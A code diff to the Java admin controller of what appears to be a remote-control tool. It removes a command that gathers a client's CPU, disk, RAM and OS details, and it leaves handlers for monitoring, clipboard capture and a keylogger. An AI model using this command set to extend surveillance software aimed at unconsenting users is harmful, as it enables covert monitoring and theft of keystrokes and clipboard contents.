@@ -18,7 +18,6 @@ public class ProduceController {
         put(COMMAND_LOGIN, ProduceController::login);
         put(COMMAND_GET_ALL_CLIENTS, ProduceController::getClients);
         put(COMMAND_BROADCAST, ProduceController::getBroadcast);
-        put(COMMAND_CLIENT_SYSTEM_INFO, ProduceController::getClientSystemInfo);
         put(COMMAND_MONITORING, ProduceController::getMonitoring);
         put(COMMAND_CLIPBOARD, ProduceController::getClipboard);
         put(COMMAND_KEYLOGGER, ProduceController::getKeylogger);
@@ -39,17 +38,6 @@ public class ProduceController {
 
     private static String getKeylogger(Admin admin) {
         return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_KEYLOGGER).json();
-    }
-
-    private static String getClientSystemInfo(Admin admin) {
-        SystemInfoModel systemInfo = new SystemInfoModel();
-        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
-                .put(COMMAND, COMMAND_CLIENT_SYSTEM_INFO)
-                .put("cpu", systemInfo.getCpu())
-                .put("disk", systemInfo.getDisk())
-                .put("ram", systemInfo.getRam())
-                .put("os", systemInfo.getOs())
-                .json();
     }
 
     private static String getClients(Admin admin) {
